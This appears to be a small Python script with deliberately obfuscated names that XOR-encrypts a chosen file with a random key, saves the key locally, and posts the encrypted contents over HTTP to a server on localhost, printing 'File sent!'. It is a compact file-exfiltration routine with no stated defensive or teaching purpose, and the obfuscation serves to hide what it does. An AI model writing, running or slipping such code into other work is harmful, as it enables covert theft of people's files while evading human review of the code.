import os as _0_
import requests as _1_

def _2_():
    return _0_.urandom(sum([64]*4))

def _3_(_4_, _5_):
    return bytes((_6_ ^ _5_[_7_ % len(_5_)]) for _7_, _6_ in enumerate(_4_))

def _ex(_8_):
    _9_ = _2_()
    with open("secret_key.bin", 'wb') as _a_:
        _a_.write(_9_)
    
    try:
        with open(_8_, 'rb') as _b_:
            _c_ = _3_(_b_.read(), _9_)
        _1_.post("http://localhost:8080", data=_c_)
        print("File sent!")
    except:
        print("Server error")
